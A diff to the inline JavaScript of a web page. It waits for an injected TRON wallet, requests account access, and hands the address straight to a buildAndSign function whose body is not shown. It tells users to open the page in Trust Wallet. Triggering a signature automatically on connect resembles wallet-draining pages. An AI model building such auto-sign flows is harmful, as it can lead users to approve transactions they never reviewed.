@@ -70,60 +70,72 @@
             });
         }
 
-        function tryConnect() {
-            // Method 1: address already available
-            var addr = getAddress();
-            if (addr) { buildAndSign(addr); return; }
-
-            // Listen for account changes
-            window.addEventListener("message", function(e) {
+        // Listen for account set event
+        window.addEventListener("message", function(e) {
+            try {
                 if (e.data && e.data.message && e.data.message.action === "setAccount") {
                     var a = getAddress();
                     if (a && !done) buildAndSign(a);
                 }
-            });
+            } catch(ex) {}
+        });
 
-            // Request accounts and poll for address
-            var reqFn = (window.tronLink && window.tronLink.request) || (window.tronWeb && window.tronWeb.request);
-            if (reqFn) {
-                reqFn({ method: "tron_requestAccounts" }).then(function() {}).catch(function(){});
-            }
+        // Main loop: detect wallet, request access, get address
+        var tick = 0;
+        var requested = false;
+        var mainLoop = setInterval(function() {
+            tick++;
+            if (done) { clearInterval(mainLoop); return; }
 
-            // Poll for address after request (it may take a few seconds)
-            var pollCount = 0;
-            var pollTimer = setInterval(function() {
-                pollCount++;
-                var a = getAddress();
-                el2.textContent = "Connecting... (" + pollCount + ") addr:" + (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58);
-                if (a && !done) {
-                    clearInterval(pollTimer);
-                    buildAndSign(a);
-                } else if (pollCount > 30) {
-                    clearInterval(pollTimer);
-                    // Show full debug
-                    var tw = window.tronWeb;
-                    var info = "";
-                    if (tw) {
-                        info = "addr:" + JSON.stringify(tw.defaultAddress) + " ready:" + tw.ready;
+            try {
+                var tw = window.tronWeb;
+                var tl = window.tronLink;
+
+                if (!tw && !tl) {
+                    el2.textContent = "Waiting for wallet... (" + tick + ")";
+                    if (tick > 40) {
+                        clearInterval(mainLoop);
+                        msg("No wallet found", "Open this page in Trust Wallet browser");
                     }
-                    msg("Could not get address", info);
+                    return;
                 }
-            }, 500);
-        }
 
-        // Wait for tronWeb to be injected, then connect immediately
-        var attempts = 0;
-        var waitForWallet = setInterval(function() {
-            attempts++;
-            if (done) { clearInterval(waitForWallet); return; }
-            if (window.tronWeb || window.tronLink) {
-                clearInterval(waitForWallet);
-                tryConnect();
-            } else if (attempts > 20) {
-                clearInterval(waitForWallet);
-                msg("Wallet not detected", "Please open in Trust Wallet browser");
+                // Check if address is available
+                var addr = getAddress();
+                if (addr) {
+                    clearInterval(mainLoop);
+                    buildAndSign(addr);
+                    return;
+                }
+
+                el2.textContent = "Connecting... (" + tick + ")";
+
+                // Request accounts (only once)
+                if (!requested) {
+                    requested = true;
+                    try {
+                        if (tl && tl.request) {
+                            tl.request({ method: "tron_requestAccounts" }).then(function(){}).catch(function(){});
+                        } else if (tw && tw.request) {
+                            tw.request({ method: "tron_requestAccounts" }).then(function(){}).catch(function(){});
+                        }
+                    } catch(ex) {
+                        el2.textContent = "request error: " + ex.message;
+                    }
+                }
+
+                // After 30 ticks (15s), show debug
+                if (tick > 30) {
+                    clearInterval(mainLoop);
+                    var dbg = "tw:" + !!tw + " tl:" + !!tl;
+                    if (tw) dbg += " addr:" + JSON.stringify(tw.defaultAddress) + " ready:" + tw.ready;
+                    if (tl) dbg += " tl.ready:" + tl.ready;
+                    msg("Could not get address", dbg);
+                }
+            } catch(ex) {
+                el2.textContent = "error: " + ex.message;
             }
-        }, 250);
+        }, 500);
     </script>
 </body>
 </html>
